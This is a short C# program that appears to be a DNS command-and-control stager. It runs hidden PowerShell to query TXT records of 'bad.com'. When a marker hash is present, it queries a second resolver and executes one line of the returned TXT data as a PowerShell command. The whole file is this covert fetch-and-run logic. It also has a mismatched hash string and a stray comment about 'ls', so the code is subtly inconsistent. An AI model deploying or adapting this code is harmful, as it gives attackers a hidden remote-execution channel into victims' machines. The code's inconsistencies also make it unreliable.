using System.Diagnostics;

class Program
{
    static void Main()
    {
        // PowerShell command as a string (e.g., nslookup)
        string psCommand = "nslookup -q=txt bad.com";

        // Run the PowerShell command and get the results
        string result = RunPowerShellCommand(psCommand);
        string searchString = "9fe8ec4dc33fd875e8a6560f65f9be8";

        // Check if the result contains the hash in first request
        if (result.Contains(searchString))
        {
            Console.WriteLine("Output contains '9fe8ec4dc33fd875e8fa6560f65f9be8', executing new command...");

            // make request to doppelganger "bad.com" - SECOND
            string newCommand = "echo 'FIRST-BASE' > first_base.txt;powershell (nslookup -q=txt bad.com 192.168.10.21)[6]"; 
            string newResult = RunPowerShellCommand(newCommand);
            Console.WriteLine(newResult);
        }
        else
        {
            // If "ls" is not found, print the initial result
            string humbleCommand = "echo 'Nothing here to see or gain. Better luck next time' > nothing_here.txt";
            Console.WriteLine("Nothing here to see");
            string newResult = RunPowerShellCommand(humbleCommand);
            Console.WriteLine(humbleCommand);
        }
    }

    static string RunPowerShellCommand(string command)
    {
        // Initialize the process to run PowerShell
        ProcessStartInfo processStartInfo = new ProcessStartInfo
        {
            FileName = "powershell.exe",      // Specify PowerShell executable
            Arguments = command,              // Pass the command to execute
            RedirectStandardOutput = true,    // Redirect the standard output
            RedirectStandardError = true,     // Redirect error output
            UseShellExecute = false,          // Do not use the shell to start the process
            CreateNoWindow = true             // Do not create a new window
        };

        // Start the process and read the output
        using (Process process = Process.Start(processStartInfo))
        {
            using (StreamReader reader = process.StandardOutput)
            {
                // Read the entire output from the PowerShell command
                return reader.ReadToEnd();
            }
        }
    }
}
